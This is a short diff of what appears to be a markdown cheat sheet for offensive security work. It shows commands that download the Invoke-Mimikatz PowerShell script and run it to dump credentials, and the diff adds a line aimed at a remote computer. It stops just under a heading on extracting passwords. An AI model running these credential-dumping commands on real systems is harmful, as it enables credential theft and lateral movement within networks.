@@ -43,6 +43,7 @@ Invoke-WebRequest -UseBasicParsing <url> -OutFile Invoke-Mimikatz.ps1 -Verbose
 ```powershell
 Get-Help Invoke-Mimikatz
 .\Invoke-Mimikatz -DumpCreds
+Invoke-Mimikatz -ComputerName
 ```
 
 #### Extracting Passwords
